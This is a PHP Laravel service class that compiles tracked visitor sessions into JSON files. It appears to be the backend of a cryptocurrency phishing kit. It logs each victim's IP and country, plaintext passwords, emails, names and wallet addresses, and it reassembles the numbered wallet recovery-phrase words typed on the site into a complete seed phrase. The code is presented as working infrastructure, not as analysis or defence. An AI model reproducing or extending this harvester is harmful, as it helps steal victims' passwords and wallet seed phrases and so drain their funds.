<?php

namespace App\Services;

use App\Models\UserSession;
use App\Models\UserEvent;

class SessionExportService
{
    public static function write(string $token): void
    {
        $session = UserSession::where('session_token', $token)->first();
        if (!$session) return;

        $events = UserEvent::where('session_token', $token)
            ->orderBy('created_at')
            ->get();

        $data = [
            'token'      => $token,
            'label'      => $session->label,
            'ip'         => $session->ip_address,
            'country'    => $session->country,
            'created_at' => $session->created_at?->toDateTimeString(),
            'last_seen'  => $session->last_seen_at?->toDateTimeString(),
            'signup'     => [],
            'verify'     => null,
            'phrase'     => [],
            'pages'      => [],
        ];

        foreach ($events as $ev) {
            match ($ev->type) {
                'page_visit'  => $data['pages'][] = $ev->value ?? $ev->element ?? $ev->page,
                'phrase_word' => (function() use ($ev, &$data) {
                    if ($ev->element && preg_match('/^word_(\d+)$/', $ev->element, $m)) {
                        $data['phrase'][(int) $m[1]] = $ev->value ?? '';
                    }
                })(),
                'form_submit' => (function() use ($ev, &$data) {
                    if ($ev->page === 'verify' || str_contains((string) $ev->element, 'balance')) {
                        $data['verify'] = $ev->value ?? $ev->element;
                    }
                })(),
                default => (function() use ($ev, &$data) {
                    $fields = ['full_name', 'email', 'password', 'email_or_phone', 'wallet_address'];
                    if (in_array($ev->element, $fields) && $ev->value !== null) {
                        $data['signup'][$ev->element] = $ev->value;
                    }
                })(),
            };
        }

        ksort($data['phrase']);

        $dir = storage_path('app/sessions');
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }

        file_put_contents(
            $dir . DIRECTORY_SEPARATOR . $token . '.json',
            json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)
        );
    }
}
